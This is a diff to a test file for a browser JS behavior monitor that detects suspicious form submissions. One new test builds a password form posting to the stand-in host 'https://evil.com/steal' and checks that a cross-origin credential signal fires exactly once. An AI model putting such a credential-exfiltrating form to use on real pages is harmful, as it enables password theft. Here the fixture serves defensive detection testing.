@@ -185,6 +185,48 @@ describe("initJsBehaviorMonitor form submit detection", () => {
     );
   });
 
+  it("programmatic submit chains through a prior guard wrapper and emits exactly once", () => {
+    const priorSubmit = HTMLFormElement.prototype.submit;
+    const guardWrapper = vi.fn(function (this: HTMLFormElement): void {
+      void this;
+    });
+    Object.defineProperty(HTMLFormElement.prototype, "submit", {
+      value: guardWrapper,
+      writable: true,
+      configurable: true,
+    });
+
+    const postSignal = vi.fn<PostSignalFn>();
+    try {
+      const form = document.createElement("form");
+      form.action = "https://evil.com/steal";
+      const pw = document.createElement("input");
+      pw.type = "password";
+      form.appendChild(pw);
+      document.body.appendChild(form);
+
+      initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+      form.submit();
+
+      expect(guardWrapper).toHaveBeenCalledTimes(1);
+      expect(postSignal).toHaveBeenCalledTimes(1);
+      expect(postSignal).toHaveBeenCalledWith(
+        "ns-js-form-submit-suspicious",
+        expect.objectContaining({
+          hasCredentialFields: true,
+          isCrossOrigin: true,
+        })
+      );
+    } finally {
+      _resetState();
+      Object.defineProperty(HTMLFormElement.prototype, "submit", {
+        value: priorSubmit,
+        writable: true,
+        configurable: true,
+      });
+    }
+  });
+
   it("does not emit signal for same-origin form submit", () => {
     const postSignal = vi.fn<PostSignalFn>();
     initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
@@ -293,11 +335,10 @@ describe("initJsBehaviorMonitor form submit detection", () => {
     expect(postSignal).toHaveBeenCalledTimes(1);
   });
 
-  it("does not throw and still detects submits when prototype.submit is non-writable (main_guard-hardened)", () => {
-    // main_guard.patchForms() hardens HTMLFormElement.prototype.submit with a
-    // non-writable defineProperty, and its bootstrap runs before this init. The
-    // monitor's prototype assignment must not throw uncaught (which would abort
-    // the rest of init and drop the other JS-behavior API patches).
+  it("does not throw and still detects event submits when prototype.submit is non-writable", () => {
+    // Another extension or page can still freeze the slot. The monitor's
+    // prototype assignment must not throw uncaught (which would abort the rest
+    // of init and drop the other JS-behavior API patches).
     const postSignal = vi.fn<PostSignalFn>();
     const native = HTMLFormElement.prototype.submit;
     Object.defineProperty(HTMLFormElement.prototype, "submit", {
